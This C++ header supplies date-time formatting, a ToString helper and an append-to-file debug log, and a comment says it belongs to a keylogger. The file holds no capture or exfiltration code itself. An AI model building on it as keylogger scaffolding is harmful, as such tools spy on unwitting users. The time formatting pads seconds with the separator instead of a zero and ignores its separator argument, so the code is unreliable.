#ifndef HELPER_H
#define HELPER_H

#include <ctime>
#include <string>
#include <sstream> // Converts things into strings
#include <fstream>

// Create a new namespace
namespace Helper{
    template <class T>

    // Function prototyping
    std::string ToString (const T &);

    struct DateTime{
        DateTime (){
            time_t ms;                                      // Time variable located in the c library
            time (&ms);

            struct tm *info = localtime (&ms);   // tm is a struct type in the c library

            D = info->tm_mday;             // Days
            m = info->tm_mon+1;           // Months
            y = 1900 + info ->tm_year;  // Years
            M = info ->tm_min;              // Minutes
            H = info->tm_hour;              // Hours
            S = info->tm_sec;               // Seconds
        }

        // Private variables for date and time
        int D = 0, m = 0, y = 0, H = 0, M = 0, S = 0;

        // Second constructor when user gives all info
        DateTime (int D, int m, int y, int H, int M, int S) : D(D), m(m), y(y), H(H), M(M), S(S) {}

        // Third constructor when time info is not given or zero
        DateTime (int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0){}

        // Getter method that returns current date and time
        DateTime Now() const {return DateTime();}

        // Formatting the date string
        std::string GetDateString() const {
            return std::string (D < 10 ? "0" : "") + ToString(D) +
                      std::string (m < 10 ? ".0" : ".") + ToString (m) + "." +
                      ToString (y);
        }

        // Formatting the time string
        std::string GetTimeString(const std::string &sep = ":") const {
            return std::string ( H < 10 ? "0" : "") +ToString (H) + sep +
                      std::string ( M < 10 ? "0" : "") +ToString (M) + sep +
                      std::string ( S < 10 ? sep : "") +ToString (S);
        }

        // Combine the date and time strings
        std::string GetDateTimeString (const std::string &sep = ":" ) const {
            return GetDateString() + " " + GetTimeString();
        }
    };

    // Writes to a string stream
    template <class T>
    std::string ToString (const T &e) {
        std::ostringstream s;
        s << e;
        return s.str();
    }

    // Records errors of the keylogger
    // For debugging purposes
    void WriteAppLog (const std::string &s) {
        std::ofstream file("AppLog.txt", std::ios::app);     // Append the AppLog text file
        file << "[" << Helper::DateTime().GetDateTimeString() << "]" <<
        "\n" << s << std::endl << "\n";
        file.close();
    }
}

#endif // HELPER_H
